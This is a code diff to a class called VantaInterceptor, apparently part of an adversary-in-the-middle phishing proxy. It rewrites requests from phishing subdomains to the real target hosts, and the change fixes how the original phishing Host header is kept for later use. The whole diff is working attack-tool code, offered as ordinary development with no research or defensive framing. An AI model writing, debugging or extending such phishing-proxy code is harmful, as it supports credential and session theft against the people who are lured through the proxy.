@@ -192,18 +192,20 @@ class VantaInterceptor:
         mapped = False
         for phish_sub, target_host in target_map.items():
             if phish_sub in host:
-                flow.request.host = target_host
+                # Capture original Host before we modify the request
+                orig_hdr = flow.request.headers.get("host") or flow.request.headers.get(":authority") or host
                 try:
                     if not hasattr(flow, "metadata"):
                         flow.metadata = {}
                 except Exception:
                     pass
+                # Apply mapping
+                flow.request.host = target_host
                 try:
-                    # Prefer external/tunnel host when available
-                    h_hdr = flow.request.headers.get("host") or flow.request.headers.get(":authority") or host
+                    # Determine effective phishing host from the ORIGINAL header
                     xfwd = flow.request.headers.get("x-forwarded-host")
                     import re as _re_ip
-                    cand = (xfwd or h_hdr or host).split(",")[0].strip()
+                    cand = (xfwd or orig_hdr or host).split(",")[0].strip()
                     if ":" in cand:
                         cand = cand.split(":", 1)[0]
                     if _re_ip.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", cand) or cand in ("localhost",):
@@ -226,6 +228,9 @@ class VantaInterceptor:
                     first_target = f"{first.orig_sub}.{first.domain}"
                 
                 if first_target:
+                    # Capture original Host before we modify the request
+                    orig_hdr = flow.request.headers.get("host") or flow.request.headers.get(":authority") or host
+                    # Apply mapping
                     flow.request.host = first_target
                     try:
                         flow.request.scheme = "https"
@@ -237,10 +242,9 @@ class VantaInterceptor:
                         pass
                     if not hasattr(flow, "metadata"):
                         flow.metadata = {}
-                    h_hdr = flow.request.headers.get("host") or flow.request.headers.get(":authority") or host
                     xfwd = flow.request.headers.get("x-forwarded-host")
                     import re as _re_ip2
-                    cand = (xfwd or h_hdr or host).split(",")[0].strip()
+                    cand = (xfwd or orig_hdr or host).split(",")[0].strip()
                     if ":" in cand:
                         cand = cand.split(":", 1)[0]
                     if _re_ip2.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", cand) or cand in ("localhost",):
